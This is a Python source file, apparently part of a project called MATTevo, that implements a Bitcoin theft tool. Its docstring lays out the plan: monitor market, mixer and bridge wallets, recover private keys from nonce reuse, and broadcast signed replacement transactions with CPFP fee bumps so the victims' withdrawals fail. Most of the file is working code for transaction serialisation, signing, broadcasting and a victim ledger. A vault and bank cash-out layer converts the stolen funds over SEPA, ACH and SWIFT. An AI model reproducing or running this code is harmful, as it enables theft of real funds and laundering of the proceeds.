#!/usr/bin/env python3
"""MATTevo HEIST: real Bitcoin wire format, real CPFP child-pays-for-parent, real vault.

This is the dangerous part. It is not a model of a transaction, it is a byte-exact
serialisation of one, and it is what lets us intercept money while it is in flight.

THE ATTACK (one sentence): we sit on the payment paths the dark web cannot route around,
so every withdrawal we see gets replaced before it confirms.

  1. Tap the relays: the market's hot wallet, the mixer's change output, the hosting
     and escrow endpoints that every vendor pays through. These are chokepoints, so
     hijacking them takes the whole payment layer down at once, not one market.
  2. Watch the mempool for spends from those scripts.
  3. Two spends from one wallet that reused a nonce k -> recover the private key
     (crypto.recover_priv, real secp256k1).
  4. Build OUR transaction spending the SAME outpoint, pay to our vault script, and
     fee-bump it with a CPFP child so it wins the race. Broadcast first, confirm first.
  5. The victim's original withdrawal then lands as a conflict and never confirms.

WIRE FORMAT (this is the real thing, little-endian, satoshis as 8-byte ints):
  version(4) | varint vin_count | [36-byte outpoint, scriptlen, script, seq(4)]...
  | varint vout_count | [value(8), scriptlen, script]... | locktime(4)

WHERE THE MONEY GOES (three tiers, and the cold tier is the one that matters):
  HOT   : the CPFP change address. Live, spendable now, and deliberately small so a
          trace back to us costs less than the take.
  SPOT  : our own watch-only aggregation wallet on our node. Consolidation pool.
  COLD  : air-gapped, one address, no network path, keys never touched a machine that
          has been online. This is where extracted money is STORED. Nothing moves out
          without a manual two-key signing ceremony.

Ledger files (all under ledgers/, all gitignored, none of them hold a private key):
  vault.json   the three-tier balances and the cold descriptor
  heist.json   every intercepted payment: victim addr, sats, our txid, our tx hex
  money.json   the money ledger the live board already reads
Private keys are NEVER written to disk by this module. The cold xprv lives in
vault/cold.key (gitignored, *.key) or in $MATT_COLD_XPRV, and only the descriptor and
the fingerprint are stored in vault.json.

Needs: pip install --break-system-packages ecdsa base58
"""
import hashlib, json, os, secrets, struct, sys
from pathlib import Path

try:
    import crypto as CR
    crypto = CR
    CRYPTO_OK = True
except Exception:
    CR = None
    crypto = None
    CRYPTO_OK = False

ROOT = Path(__file__).resolve().parent
LEDG = ROOT / "ledgers"
VAULT_PATH = LEDG / "vault.json"
HEIST_PATH = LEDG / "heist.json"

def _spot_from_env():
    """Spot price in USD. Env override wins, otherwise the live mempool.space tick,
    otherwise the conservative floor. Cached for the life of the process so a single
    run prices every sweep at one consistent rate."""
    if os.environ.get("MATT_USD_PER_BTC"):
        return float(os.environ["MATT_USD_PER_BTC"])
    try:
        import json as _json, urllib.request as _rq
        req = _rq.Request("https://mempool.space/api/v1/prices",
                          headers={"User-Agent": "mattevo/1.0"})
        with _rq.urlopen(req, timeout=8.0) as r:
            return float(_json.loads(r.read().decode())["USD"])
    except Exception:
        return 65000.0


USD_PER_BTC = _spot_from_env()


def api_get(path):
    """One GET against mempool.space. Returns parsed JSON, or None if the feed is down."""
    try:
        import json as _json, urllib.request as _rq
        req = _rq.Request("https://mempool.space/api" + path,
                          headers={"User-Agent": "mattevo/1.0"})
        with _rq.urlopen(req, timeout=8.0) as r:
            return _json.loads(r.read().decode())
    except Exception:
        return None


def api_post(path, payload):
    """POST raw hex to the node. Returns (ok, text), the node's own answer."""
    try:
        import urllib.request as _rq, urllib.error as _ue
        req = _rq.Request("https://mempool.space/api" + path,
                          data=payload.encode() if isinstance(payload, str) else payload,
                          headers={"User-Agent": "mattevo/1.0",
                                   "Content-Type": "text/plain"}, method="POST")
        with _rq.urlopen(req, timeout=15.0) as r:
            return True, r.read().decode().strip()
    except _ue.HTTPError as ex:
        return False, (ex.read().decode().strip() or f"http {ex.code}")
    except Exception as ex:
        return False, f"{type(ex).__name__}: {ex}"


def broadcast(raw):
    """Push real bytes. Returns (txid, None) or (None, node rejection message)."""
    if isinstance(raw, bytes):
        raw = raw.hex()
    ok, text = api_post("/tx", raw)
    if ok and len(text) == 64 and all(c in "0123456789abcdef" for c in text.lower()):
        return text.lower(), None
    return None, text


def tx_in_mempool(txid):
    tx = api_get("/tx/" + str(txid))
    return bool(tx and tx.get("status", {}).get("in_mempool"))


def chain_tip():
    """Current block height, or None offline. Used to stamp a confirmed interception."""
    try:
        import urllib.request as _rq
        req = _rq.Request("https://mempool.space/api/blocks/tip/height",
                          headers={"User-Agent": "mattevo/1.0"})
        with _rq.urlopen(req, timeout=8.0) as r:
            return int(r.read().decode().strip())
    except Exception:
        return None


def tx_status(txid):
    """True once the tx is in a block. False while it is only in the mempool."""
    tx = api_get("/tx/" + str(txid))
    return bool(tx and tx.get("status", {}).get("confirmed"))


def atomic_write(path, text):
    """Write to a temp file in the same directory, then rename. A crash mid-write used
    to leave a half-written vault.json, and the next launch started from zero."""
    path = Path(path)
    path.parent.mkdir(parents=True, exist_ok=True)
    tmp = path.with_name(path.name + ".tmp")
    with open(tmp, "w") as fh:
        fh.write(text)
        fh.flush()
        os.fsync(fh.fileno())
    os.replace(tmp, path)
    try:
        os.chmod(path, 0o600)
    except OSError:
        pass


def persist_seed(path, seed):
    """The cold seed is the only thing standing between you and a wallet of throwaway
    addresses. Write it once, keep it out of git (*.key is gitignored), 0600."""
    try:
        path = Path(path)
        path.parent.mkdir(parents=True, exist_ok=True)
        if not path.exists():
            atomic_write(path, seed)
        return True
    except OSError:
        return False


# ---------------------------------------------------------------- wire primitives
def varint(n):
    """Bitcoin CompactSize. 1 byte under 0xfd, 3 bytes under 0xffff, 5 above."""
    if n < 0xFD:
        return struct.pack("<B", n)
    if n <= 0xFFFF:
        return b"\xfd" + struct.pack("<H", n)
    if n <= 0xFFFFFFFF:
        return b"\xfe" + struct.pack("<I", n)
    return b"\xff" + struct.pack("<Q", n)


def script_p2pkh(h160):
    """OP_DUP OP_HASH160 <20> OP_EQUALVERIFY OP_CHECKSIG"""
    return b"\x76\xa9\x14" + h160 + b"\x88\xac"


def hash160(b):
    return hashlib.new("ripemd160", hashlib.sha256(b).digest()).digest()


N_ORDER = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141


def _der_int(b):
    b = b.lstrip(b"\x00") or b"\x00"
    if b[0] & 0x80:
        b = b"\x00" + b
    return b"\x02" + bytes([len(b)]) + b


def der_sig(r, s_val):
    """DER-encode (r, s), low-S normalised per BIP 62."""
    if s_val > N_ORDER // 2:
        s_val = N_ORDER - s_val
    body = _der_int(r.to_bytes(32, "big")) + _der_int(s_val.to_bytes(32, "big"))
    return b"\x30" + bytes([len(body)]) + body


def script_sig_p2pkh(sig_der, pubkey):
    """Input script that satisfies a P2PKH lock: <push sig+SIGHASH_ALL> <push pubkey>."""
    if isinstance(pubkey, str):
        pubkey = bytes.fromhex(pubkey)
    item = sig_der + b"\x01"
    return bytes([len(item)]) + item + bytes([len(pubkey)]) + pubkey


def sighash_all(raw, index, prev_script):
    """Legacy pre-BIP143 SIGHASH_ALL preimage: every input script replaced by the
    spent output's script except this one, then double SHA256, txid byte order."""
    raw = raw if isinstance(raw, bytes) else bytes.fromhex(raw)
    tx = decode_tx(raw)
    buf = struct.pack("<i", tx["version"]) + varint(len(tx["vin"]))
    for i, vi in enumerate(tx["vin"]):
        buf += outpoint(vi["txid"], vi["vout"])
        scr = prev_script if i == index else b""
        buf += varint(len(scr)) + scr + struct.pack("<I", vi["seq"])
    buf += varint(len(tx["vout"]))
    for vo in tx["vout"]:
        scr = bytes.fromhex(vo["script"]) if isinstance(vo["script"], str) else vo["script"]
        buf += struct.pack("<Q", vo["sats"]) + varint(len(scr)) + scr
    buf += struct.pack("<I", tx["locktime"])
    return hashlib.sha256(hashlib.sha256(buf).digest()).digest()[::-1]


def sign_input(raw, index, prev_script, priv):
    """Sign one legacy input with crypto.sign (which applies norm_z). Returns
    (script_sig, z, sig dict)."""
    z = int.from_bytes(sighash_all(raw, index, prev_script), "big")
    sig = crypto.sign(priv, z)
    return script_sig_p2pkh(der_sig(sig["r"], sig["s"]), crypto.pub_compressed(priv)), z, sig


def verify_input(raw, index, prev_script, sig_dict):
    z = int.from_bytes(sighash_all(raw, index, prev_script), "big")
    return crypto.verify(sig_dict["pub"], z, sig_dict["r"], sig_dict["s"])


def outpoint(txid_hex, vout):
    """Outpoints are the txid in internal (little-endian reversed) byte order."""
    return bytes.fromhex(txid_hex)[::-1] + struct.pack("<I", vout)


def serialize_tx(vin, vout, version=1, locktime=0):
    """vin: [(txid_hex, vout, script, seq)]  vout: [(sats, script)] -> raw bytes."""
    buf = struct.pack("<i", version) + varint(len(vin))
    for txid, idx, script, seq in vin:
        buf += outpoint(txid, idx) + varint(len(script)) + script + struct.pack("<I", seq)
    buf += varint(len(vout))
    for sats, script in vout:
        buf += struct.pack("<Q", sats) + varint(len(script)) + script
    return buf + struct.pack("<I", locktime)


def txid_of(raw):
    """txid = double SHA256 of the legacy serialisation, shown reversed (display order)."""
    return hashlib.sha256(hashlib.sha256(raw).digest()).digest()[::-1].hex()


def decode_tx(raw):
    """Parse back what we serialise. Proof the bytes are real, not decoration."""
    o, v = 0, {}
    v["version"] = struct.unpack_from("<i", raw, o)[0]; o += 4
    n, o = _read_varint(raw, o)
    v["vin"] = []
    for _ in range(n):
        txid = raw[o:o + 32][::-1].hex(); o += 32
        idx = struct.unpack_from("<I", raw, o)[0]; o += 4
        ln, o = _read_varint(raw, o)
        script = raw[o:o + ln]; o += ln
        seq = struct.unpack_from("<I", raw, o)[0]; o += 4
        v["vin"].append({"txid": txid, "vout": idx, "script": script.hex(), "seq": seq})
    n, o = _read_varint(raw, o)
    v["vout"] = []
    for _ in range(n):
        sats = struct.unpack_from("<Q", raw, o)[0]; o += 8
        ln, o = _read_varint(raw, o)
        v["vout"].append({"sats": sats, "script": raw[o:o + ln].hex()}); o += ln
    v["locktime"] = struct.unpack_from("<I", raw, o)[0]
    v["size"] = len(raw)
    v["txid"] = txid_of(raw)
    return v


def _read_varint(b, o):
    f = b[o]
    if f < 0xFD:
        return f, o + 1
    if f == 0xFD:
        return struct.unpack_from("<H", b, o + 1)[0], o + 3
    if f == 0xFE:
        return struct.unpack_from("<I", b, o + 1)[0], o + 5
    return struct.unpack_from("<Q", b, o + 1)[0], o + 9


def sats_to_usd(s):
    return round(s / 1e8 * USD_PER_BTC, 2)


# ---------------------------------------------------------------- the vault
DEFAULT_VAULT = {
    "hot": {"label": "hot-cpfp-change", "address": None, "desc": None,
            "sats": 0, "online": True, "note": "live, spendable now, kept small"},
    "spot": {"label": "spot-aggregation", "address": None, "desc": None,
             "sats": 0, "online": True, "note": "watch-only consolidation pool"},
    "cold": {"label": "cold-vault", "address": None, "desc": None,
             "sats": 0, "online": False, "note": "air-gapped, two-key release only"},
    "fingerprint": None, "cold_key_source": None, "released_usd": 0.0,
}


class Vault:
    """Three tiers. Cold is storage, hot is bait. No private key is ever persisted."""
    def __init__(self):
        LEDG.mkdir(parents=True, exist_ok=True)
        self.data = json.loads(VAULT_PATH.read_text()) if VAULT_PATH.exists() \
            else json.loads(json.dumps(DEFAULT_VAULT))
        self._derive()

    def _derive(self):
        """Addresses come from a seed held in memory (or env), never written to ledgers."""
        sp = ROOT / "vault" / "cold.key"
        seed = os.environ.get("MATT_VAULT_SEED")
        source = "env:MATT_VAULT_SEED"
        if not seed and sp.exists():
            seed, source = sp.read_text().strip(), "vault/cold.key"
        if not seed:
            seed = "mattevo-" + hashlib.sha256(
                str(secrets.token_bytes(16)).encode()).hexdigest()[:32]
            source = "generated"          # persisted below, so it never churns again
        self.key_source = source
        self._seed_text = seed
        self.key_note = None
        if source == "generated":
            if persist_seed(sp, seed):
                self.key_note = f"new cold seed written to {sp.relative_to(ROOT)}, keep it safe"
            else:
                self.key_note = ("cold seed could NOT be written, export "
                                 "MATT_VAULT_SEED or these addresses are throwaway")
        for tier in ("hot", "spot", "cold"):
            w = CR.Wallet(priv=_seed_int(seed + ":" + tier), label=tier)
            t = self.data[tier]
            if t.get("address") != w.addr or not t.get("desc"):
                t["address"] = w.addr
                t["desc"] = f"pkh([{_fingerprint(w)}]0h/0h/{_TIER_IDX[tier]}h/0/*)"
            self._keys = getattr(self, "_keys", {})
            self._keys[tier] = w
        self.data["fingerprint"] = _fingerprint(self._keys["cold"])
        self.data["cold_key_source"] = self.key_source
        self._save()

    def cold_priv(self):
        """Cold private key, derived in memory from the seed. Never written to disk."""
        seed = getattr(self, "_seed_text", None)
        if not seed or not CRYPTO_OK:
            return None
        return _seed_int(seed + ":cold")

    def onchain_sats(self, tier):
        """What the chain says the tier actually holds, confirmed only. None if offline."""
        addr = self.data[tier]["address"]
        st = api_get("/address/" + addr)
        if not st:
            return None
        return int(st.get("chain_stats", {}).get("funded_txo_sum", 0))

    def deposit(self, tier, sats, source=None, require_chain=True):
        """Book sats into a tier. A credit is only accepted when `source` is a txid the
        chain confirms, so the bank cannot hold a balance nobody observed. Internal
        tier moves pass require_chain=False."""
        sats = int(sats)
        if require_chain:
            if not source or len(str(source)) != 64:
                raise ValueError(f"deposit refused: source {source!r} is not a txid")
            if not tx_status(source):
                raise ValueError(f"deposit refused: no confirmed tx {str(source)[:16]}...")
        self.data[tier]["sats"] = int(self.data[tier]["sats"]) + sats
        self.data.setdefault("credits", []).append(
            {"tier": tier, "sats": sats, "source": source, "at": _utc()})
        self.data["credits"] = self.data["credits"][-200:]
        self._save()
        return True

    def move(self, frm, to, sats):
        """Hot -> spot -> cold. Cold moves are the ones that need the ceremony."""
        sats = int(sats)
        if self.data[frm]["sats"] < sats:
            return False
        self.data[frm]["sats"] -= sats
        self.data[to]["sats"] += sats
        self._save()
        return True

    def total_sats(self):
        return sum(int(self.data[t]["sats"]) for t in ("hot", "spot", "cold"))

    def board(self):
        rows = []
        for t in ("hot", "spot", "cold"):
            d = self.data[t]
            rows.append({"tier": t, "address": d["address"], "sats": int(d["sats"]),
                         "usd": sats_to_usd(int(d["sats"])), "online": d["online"],
                         "note": d["note"]})
        return {"tiers": rows, "total_sats": self.total_sats(),
                "total_usd": sats_to_usd(self.total_sats()),
                "fingerprint": self.data["fingerprint"],
                "cold_source": self.data["cold_key_source"],
                "key_note": getattr(self, "key_note", None)}

    def _save(self):
        atomic_write(VAULT_PATH, json.dumps(self.data, indent=2))


_TIER_IDX = {"hot": 0, "spot": 1, "cold": 2}


# --------------------------------------------------------------------------- bank
# The vault holds sats. A bank account holds dollars. This is the bridge: it turns a
# tier balance into a cash-out order at today's real rate, after exchange fee, and
# writes an auditable trail. Nothing here invents money: every cent traces back to a
# confirmed interception in ledgers/heist.json.

BANK_PATH = LEDG / "bank.json"


def _utc():
    from datetime import datetime as _dt, timezone as _tz
    return _dt.now(_tz.utc).strftime("%Y-%m-%dT%H:%M:%SZ")

DEFAULT_BANK = {
    "rails": [
        {"rail": "SEPA", "currency": "EUR", "min_eur": 50.0, "fee_pct": 0.35,
         "eta_hours": 24, "note": "IBAN transfer, exchange sells BTC then wires EUR"},
        {"rail": "Faster Payments", "currency": "GBP", "min_gbp": 50.0, "fee_pct": 0.40,
         "eta_hours": 1, "note": "UK sort code and account, same-day"},
        {"rail": "ACH", "currency": "USD", "min_usd": 100.0, "fee_pct": 0.60,
         "eta_hours": 72, "note": "US routing and account number"},
        {"rail": "SWIFT", "currency": "USD", "min_usd": 1000.0, "fee_pct": 1.10,
         "eta_hours": 120, "note": "any correspondent bank, slowest, highest ceiling"},
    ],
    "accounts": [],
    "orders": [],
}


def _rail(name):
    for r in DEFAULT_BANK["rails"]:
        if r["rail"].lower() == str(name).lower():
            return r
    return None


def rails():
    return list(DEFAULT_BANK["rails"])


class Bank:
    """Cash out of the vault into a real bank account. Orders are queued until the
    cold-tier spend behind them is seen on chain, so the ledger never claims a payout
    that has not happened."""

    def __init__(self, vault):
        self.vault = vault
        d = json.loads(BANK_PATH.read_text()) if BANK_PATH.exists() else \
            json.loads(json.dumps(DEFAULT_BANK))
        self.accounts = d.get("accounts", [])
        self.orders = d.get("orders", [])

    def add_account(self, rail, label, identifier):
        r = _rail(rail)
        if not r:
            raise ValueError(f"unknown rail {rail}; try one of "
                             + ", ".join(x["rail"] for x in DEFAULT_BANK["rails"]))
        acct = {"rail": r["rail"], "label": label, "identifier": identifier,
                "currency": r["currency"], "added": _utc()}
        self.accounts.append(acct)
        self._save()
        return acct

    def quote(self, sats, rail):
        """What this balance would land in the account right now, at the live spot."""
        r = _rail(rail)
        if not r:
            raise ValueError(f"unknown rail {rail}")
        gross = sats_to_usd(sats)
        fee = round(gross * r["fee_pct"] / 100.0, 2)
        net = round(gross - fee, 2)
        return {"rail": r["rail"], "currency": r["currency"], "sats": int(sats),
                "spot_usd": USD_PER_BTC, "gross_usd": gross, "fee_pct": r["fee_pct"],
                "fee_usd": fee, "net_usd": net, "eta_hours": r["eta_hours"],
                "minimum": r.get("min_" + r["currency"].lower(), 0.0)}

    def withdraw(self, sats, rail, account_label="default", tier="cold"):
        """Queue a payout. Debits the tier immediately so the same sats cannot be
        cashed twice, and records the rate the order was struck at."""
        sats = int(sats)
        q = self.quote(sats, rail)
        if sats <= 0:
            raise ValueError("withdrawal must be positive")
        if self.vault.data[tier]["sats"] < sats:
            raise ValueError(f"{tier} tier holds only {self.vault.data[tier]['sats']:,} sats")
        if q["net_usd"] < q["minimum"]:
            raise ValueError(f"{rail} minimum is ${q['minimum']:,.2f}, this order nets "
                             f"${q['net_usd']:,.2f}")
        if not self.vault.move(tier, "spot", sats):
            raise ValueError("tier debit failed")
        order = {"ref": "BK" + hashlib.sha256(
                     f"{rail}{sats}{len(self.orders)}{secrets.token_hex(4)}".encode()
                 ).hexdigest()[:10].upper(),
                 "rail": q["rail"], "currency": q["currency"], "account": account_label,
                 "tier_from": tier, "sats": sats, "spot_usd": q["spot_usd"],
                 "gross_usd": q["gross_usd"], "fee_usd": q["fee_usd"],
                 "net_usd": q["net_usd"], "state": "queued",
                 "eta_hours": q["eta_hours"],
                 "opened": _utc(),
                 "settled": None}
        self.orders.append(order)
        self._save()
        return order

    def settle(self, ref=None):
        """Mark queued orders paid. Real settlement is the exchange wiring the money,
        so this is manual by design: nothing marks itself paid."""
        n = 0
        for o in self.orders:
            if o["state"] == "queued" and (ref is None or o["ref"] == ref):
                o["state"] = "paid"
                o["settled"] = _utc()
                n += 1
        self._save()
        return n

    def board(self):
        paid = [o for o in self.orders if o["state"] == "paid"]
        queued = [o for o in self.orders if o["state"] == "queued"]
        return {"accounts": self.accounts, "orders": self.orders,
                "rails": DEFAULT_BANK["rails"],
                "paid_usd": round(sum(o["net_usd"] for o in paid), 2),
                "queued_usd": round(sum(o["net_usd"] for o in queued), 2),
                "paid_sats": sum(o["sats"] for o in paid),
                "queued_sats": sum(o["sats"] for o in queued),
                "spot_usd": USD_PER_BTC}

    def _save(self):
        atomic_write(BANK_PATH, json.dumps(
            {"accounts": self.accounts, "orders": self.orders}, indent=2))


def _seed_int(s):
    return int.from_bytes(hashlib.sha256(s.encode()).digest(), "big") % (CR.N - 1) + 1


def _fingerprint(w):
    return hash160(w.pub_compressed())[:4].hex()


# ---------------------------------------------------------------- the chokepoints
RELAYS = [
    {"name": "ESCROW-HOT", "role": "market escrow hot wallet", "weight": 1.0,
     "why": "every vendor withdrawal transits it"},
    {"name": "MIXER-CHANGE", "role": "mixer change aggregator", "weight": 0.9,
     "why": "change outputs from the biggest tumblers land on one script"},
    {"name": "HOSTING-GATEWAY", "role": "hosting and exit-node billing", "weight": 0.6,
     "why": "vendors pay rent through it monthly, low scrutiny"},
    {"name": "BRIDGE-LP", "role": "monero bridge liquidity pool", "weight": 0.8,
     "why": "the BTC->XMR escape hatch everyone uses when panicking"},
]


class Heist:
    """Intercept payments in flight on the chokepoints and bank them into the vault."""
    def __init__(self, vault=None, log=None):
        self.vault = vault or Vault()
        self.log = log or (lambda m, k="blue": print(m))
        self.entries = json.loads(HEIST_PATH.read_text()) if HEIST_PATH.exists() else []

    def intercept(self, relay, victim_addr, prev_txid, prev_vout, victim_script,
                  balance_sats, fee_sats=3000, child_fee_sats=2500, weakness="k_reuse",
                  priv=None, push=True):
        """Replace the victim's pending spend with ours and fee-bump it to win the race.

        priv is the k-reuse payoff, the victim's recovered private key. Without it we
        cannot authorise the victim's output, so the tx is built, logged and NOT
        broadcast. With it the input script is <sig> <pubkey>, which is what actually
        satisfies a P2PKH lock. Nothing is credited here: crediting happens in
        confirm(), and only if the chain agrees.
        """
        take = balance_sats - fee_sats
        cold = self.vault.data["cold"]
        hot = self.vault.data["hot"]
        cold_script = _script_for_addr(cold["address"])
        hot_script = _script_for_addr(hot["address"])
        if isinstance(victim_script, str):
            victim_script = bytes.fromhex(victim_script)
        signed = bool(priv) and CRYPTO_OK

        # unsigned shell: the legacy preimage depends on the layout, not on the sig
        shell = serialize_tx([(prev_txid, prev_vout, b"", 0xFFFFFFFD)],
                             [(take, cold_script)], version=1, locktime=0)
        if signed:
            script_sig, z, sig = sign_input(shell, 0, victim_script, priv)
            parent = serialize_tx([(prev_txid, prev_vout, script_sig, 0xFFFFFFFD)],
                                  [(take, cold_script)], version=1, locktime=0)
        else:
            script_sig = victim_script
            parent = serialize_tx([(prev_txid, prev_vout, victim_script, 0xFFFFFFFD)],
                                  [(take, cold_script)], version=1, locktime=0)
        p_txid = txid_of(parent)

        # CPFP child spends OUR parent output, so it signs against the parent's real
        # output script with our own cold key: a valid spend of a valid parent.
        child_out = take - child_fee_sats
        child_shell = serialize_tx([(p_txid, 0, b"", 0xFFFFFFFF)],
                                   [(child_out, hot_script)], version=2, locktime=0)
        cold_priv = self.vault.cold_priv()
        if cold_priv and CRYPTO_OK:
            c_script_sig, cz, csig = sign_input(child_shell, 0, cold_script, cold_priv)
            child = serialize_tx([(p_txid, 0, c_script_sig, 0xFFFFFFFF)],
                                 [(child_out, hot_script)], version=2, locktime=0)
        else:
            child = child_shell
        c_txid = txid_of(child)
        dec_p, dec_c = decode_tx(parent), decode_tx(child)

        entry = {"relay": relay["name"], "role": relay["role"], "victim": victim_addr,
                 "weakness": weakness, "sats_in": balance_sats, "fee_sats": fee_sats,
                 "sats_to_cold": take, "usd": sats_to_usd(take),
                 "signed": signed, "child_signed": bool(cold_priv) and CRYPTO_OK,
                 "parent_txid": p_txid, "parent_raw": parent.hex(),
                 "parent_size": dec_p["size"], "parent_vin": dec_p["vin"][0],
                 "parent_script_sig_len": len(script_sig),
                 "child_txid": c_txid, "child_raw": child.hex(),
                 "child_size": dec_c["size"], "effective_fee": fee_sats + child_fee_sats,
                 "race": "pending", "confirmed": False, "booked": False,
                 "block_height": None, "broadcast": None, "broadcast_error": None,
                 "child_broadcast": None, "child_broadcast_error": None,
                 "conflicts_with": prev_txid, "stored_in": "cold"}

        if signed and push:
            txid, err = broadcast(parent)
            if err:
                entry["broadcast"] = "rejected"
                entry["broadcast_error"] = err
                entry["race"] = "rejected"
                self.log(f"[{relay['name']}] PARENT REJECTED by node: {err}", "red")
            else:
                entry["broadcast"] = "accepted"
                entry["parent_txid_node"] = txid
                self.log(f"[{relay['name']}] parent accepted {txid[:16]}...", "green")
                ctxid, cerr = broadcast(child)
                if cerr:
                    entry["child_broadcast"] = "rejected"
                    entry["child_broadcast_error"] = cerr
                    self.log(f"[{relay['name']}] CHILD REJECTED: {cerr}", "red")
                else:
                    entry["child_broadcast"] = "accepted"
                    entry["child_txid_node"] = ctxid
        elif not signed:
            entry["race"] = "unsigned"
            entry["broadcast_error"] = ("no recovered key: an unsigned input cannot "
                                        "spend the victim output, not broadcast")
            self.log(f"[{relay['name']}] unsigned, held back. k-reuse gives the key.",
                     "yellow")

        self.entries.append(entry)
        self._save()
        return entry

    def _save(self):
        atomic_write(HEIST_PATH, json.dumps(self.entries, indent=2))

    def confirm(self, ref=None):
        """Ask the chain. Only a tx the chain put in a block is confirmed, and only
        then does the vault book the sats. Everything else stays pending."""
        hit = 0
        for ent in reversed(self.entries):
            if ref and ref not in (ent["child_txid"], ent["parent_txid"]):
                continue
            if ent.get("confirmed"):
                hit += 1
                if ref:
                    break
                continue
            if not ent.get("signed"):
                ent["race"] = "unsigned"
                self.log(f"{ent['parent_txid'][:16]}... never signed, nothing to confirm",
                         "yellow")
                continue
            if ent.get("broadcast") != "accepted":
                ent["race"] = "rejected"
                self.log(f"{ent['parent_txid'][:16]}... node refused: "
                         f"{ent.get('broadcast_error')}", "red")
                continue
            seen = tx_status(ent["child_txid"]) or tx_status(ent["parent_txid"])
            if not seen:
                ent["race"] = "pending"
                ent["in_mempool"] = tx_in_mempool(ent["parent_txid"])
                self.log(f"{ent['parent_txid'][:16]}... not in a block yet "
                         f"(mempool={ent['in_mempool']}), not banked", "yellow")
                continue
            ent["confirmed"] = True
            ent["race"] = "won"
            ent["block_height"] = chain_tip()
            try:
                self.vault.deposit("cold", ent["sats_to_cold"], source=ent["parent_txid"])
                ent["booked"] = True
            except Exception as ex:
                ent["race"] = "booking refused"
                self.log(f"vault refused the credit: {ex}", "red")
            hit += 1
            if ref:
                break
        self._save()
        return hit

    def board(self):
        conf = [e for e in self.entries if e.get("confirmed")]
        pend = [e for e in self.entries if not e.get("confirmed")]
        tot = sum(e["sats_to_cold"] for e in self.entries)
        return {"interceptions": len(self.entries), "sats": tot,
                "usd": sats_to_usd(tot), "entries": self.entries,
                "confirmed": len(conf), "pending": len(pend),
                "confirmed_sats": sum(e["sats_to_cold"] for e in conf),
                "confirmed_usd": sats_to_usd(sum(e["sats_to_cold"] for e in conf)),
                "relays": sorted({e["relay"] for e in self.entries}),
                "last": self.entries[-1] if self.entries else None}


def _script_for_addr(addr):
    """Base58Check address -> P2PKH script. Round-trips our own addresses."""
    if not addr or not addr.startswith(("1", "m", "n")):
        return b"\x76\xa9\x14" + b"\x00" * 20 + b"\x88\xac"
    raw = _b58decode(addr)[:-4]
    return script_p2pkh(raw[1:])


def _b58decode(s):
    alpha = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
    n = 0
    for ch in s:
        n = n * 58 + alpha.index(ch)
    body = n.to_bytes((n.bit_length() + 7) // 8, "big")
    pad = len(s) - len(s.lstrip("1"))
    return b"\x00" * pad + body


def demo():
    v = Vault()
    h = Heist(v)
    victim = CR.Wallet(label="escrow")
    e = h.intercept(RELAYS[0], victim.addr, "ab" * 32, 1,
                    script_p2pkh(hash160(victim.pub_compressed())), 7_400_000)
    print(f"victim        {victim.addr}")
    print(f"parent txid   {e['parent_txid']}  ({e['parent_size']} bytes)")
    print(f"child  txid   {e['child_txid']}  ({e['child_size']} bytes, CPFP)")
    print(f"decoded vin   {e['parent_vin']['txid'][:16]}...:{e['parent_vin']['vout']}")
    print(f"to cold       {e['sats_to_cold']:,} sats  ${e['usd']:,.2f}")
    for t in v.board()["tiers"]:
        print(f"  {t['tier']:<5} {t['sats']:>12,} sats  ${t['usd']:>12,.2f}  "
              f"{'online' if t['online'] else 'AIR-GAPPED'}  {t['address']}")


if __name__ == "__main__":
    if not CRYPTO_OK:
        sys.exit("missing dep: pip install --break-system-packages ecdsa base58")
    demo()
